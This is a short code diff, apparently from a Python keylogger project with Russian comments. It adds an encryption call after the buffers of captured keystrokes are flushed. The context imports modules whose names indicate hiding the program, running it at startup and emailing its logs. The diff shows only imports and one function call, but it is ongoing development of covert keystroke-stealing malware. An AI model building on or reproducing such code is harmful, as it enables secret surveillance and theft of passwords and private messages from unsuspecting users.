@@ -17,6 +17,7 @@ from sending_to_email import *
 import threading
 from hide_programm import *
 from autho_run_programm import *
+from encryption import main_ecrp
 
 # СЛОВАРИ
 # издевательство, перевод с англ раскладки на РУ
@@ -75,6 +76,7 @@ class AddTextFile:
             log_keys.clear()
             log_keys_sys.clear()
 
+            main_ecrp()
 
 class LanguageQual(AddTextFile):
     """КЛАСС ПОЛУЧЕНИЯ ЯЗЫКА РАССКЛАДКИ"""
